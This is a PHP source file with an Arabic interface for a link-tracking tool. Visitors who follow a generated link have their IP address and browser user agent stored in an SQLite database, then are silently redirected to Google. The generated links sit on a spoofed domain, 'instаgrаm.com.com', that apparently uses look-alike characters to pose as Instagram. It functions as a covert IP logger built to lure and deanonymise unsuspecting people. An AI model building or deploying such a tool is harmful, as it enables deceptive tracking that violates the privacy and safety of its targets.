<?php
$db = new PDO('sqlite:tracker.db');
$db->exec("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ip TEXT, user_agent TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");

if (isset($_GET['redirect'])) {
    $code = $_GET['redirect'];
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    $stmt = $db->prepare("INSERT INTO logs (code, ip, user_agent) VALUES (?, ?, ?)");
    $stmt->execute([$code, $ip, $ua]);

    header("Location: https://www.google.com");
    exit();
}

$generated_link = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $code = substr(md5(uniqid(rand(), true)), 0, 6);
    $generated_link = "https://www.instаgrаm.com.com/?redirect=" . $code;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مُتتبع الروابط</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 40px; background: #f4f4f9; }
        .card { background: white; padding: 20px; border-radius: 8px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        input[type="submit"] { background: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
        .result { background: #e9ecef; padding: 10px; margin-top: 15px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="card">
        <h2>توليد رابط التتبع</h2>
        <form method="POST">
            <input type="submit" name="create" value="إنشاء رابط جديد">
        </form>
        <?php if (!empty($generated_link)): ?>
            <div class="result">
                <strong>الرابط الخاص بك:</strong><br>
                <a href="<?php echo $generated_link; ?>" target="_blank"><?php echo $generated_link; ?></a>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
